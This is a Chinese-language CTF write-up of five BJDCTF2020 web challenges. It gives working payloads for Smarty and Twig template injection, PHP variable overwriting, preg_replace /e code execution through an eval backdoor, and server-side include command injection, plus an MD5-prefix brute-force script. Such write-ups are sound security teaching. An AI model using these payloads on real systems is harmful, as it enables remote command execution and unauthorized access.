# BJDCTF2020 Write Up

## 0x01 [BJDCTF2020]The mystery of ip

提示IP,发现是``X-Forwarded-For``搞的

fuzz一下发现有模板注入漏洞

这里的渲染引擎是基于PHP的smarty

Poc:``{{system("<cmd>")}}``

## 0x02 [BJDCTF2020]Cookie is so stable

和上题一样是模板注入，不过注入点在Cookie里

渲染引擎也换成了Twig

从网上找到的 Twig poc

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

## 0x03 [BJDCTF2020]Mark loves cat

进去看了一下没事注入点似乎

扫下目录发现
```
Target: http://ae5480b9-ea51-4d2a-8741-c8968aa682f8.node3.buuoj.cn/

[19:51:17] Starting:
[19:51:20] 200 -   73B  - /.git/description
[19:51:20] 200 -   23B  - /.git/HEAD
[19:51:20] 301 -  169B  - /.git  ->  http://ae5480b9-ea51-4d2a-8741-c8968aa682f8.node3.buuoj.cn/.git/
[19:51:20] 200 -  137B  - /.git/config
[19:51:21] 200 -    6KB - /.git/index
[19:51:22] 403 -  555B  - /.git/
[19:51:23] 200 -   28KB - /index.php
[19:51:30] 200 -    0B  - /flag.php

Task Completed
```

考虑用Githack 来获取源码

```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
```

如果要拿到flag 我们要保证GET和POST上设定了flag变量

但是根据

```php
foreach($_POST as $x => $y){
    $$x = $y;
}
```
这样后面的``$flag``就会被我们覆盖，拿不到值

但是``exit()``和``die()``一样，所以我们只要把

```php
$yds = "dog";
$is = "cat";
$handsome = 'yds';
```
这几个变量改成``$flag``就可以了

PHP中``$$a``可以理解为``${$a}``

```php
foreach($_GET as $x => $y){// yds => flag
    $$x = $$y; // $yds = $flag
}
```
## 0x04 [BJDCTF2020]ZJCTF不过如此

第一层用``php://input``传值，用``php://filter/convert.base64-encode/resource=next.php``看源码

拿到

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```
很显然这里利用``pregmatch \e``调用``getFlag``后门

为了匹配 我们这里设置``$re=\S*``匹配所有非空字符

payload:``/next.php?\S*=${getFlag()}&cmd=<cmd>``


## 0x05 [BJDCTF2020]EasySearch

进去是一个登陆界面，试了一下万能密码都不行，也没有报错信息

扫一下是否有源码泄露，拿到了index.php.swp

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```
可以看到只要满足

``$admin == '6d0bc1' == substr(md5($_POST['password']),0,6)``

随便跑个脚本找下

```python
#coding=utf-8
import hashlib
for i in range(10000000):
    payload=str(i).rjust(7,"0")
    md5 = hashlib.md5(payload.encode('utf-8')).hexdigest()
    if ((md5[0:6])=='6d0bc1'):
        print payload  #2020666
        break
```

然后根据源码应该就是利用可控的``$_POST['username']``向生成的``.shtml``文件里注入恶意代码了

SSI Poc
```
<!--#exec cmd="<cmd>"-->
```

返回的报文会提供生成的shtml文件目录

至此我们便可以RCE了

### 参考资料

一篇文章带你理解漏洞之SSTI漏洞:

[https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E)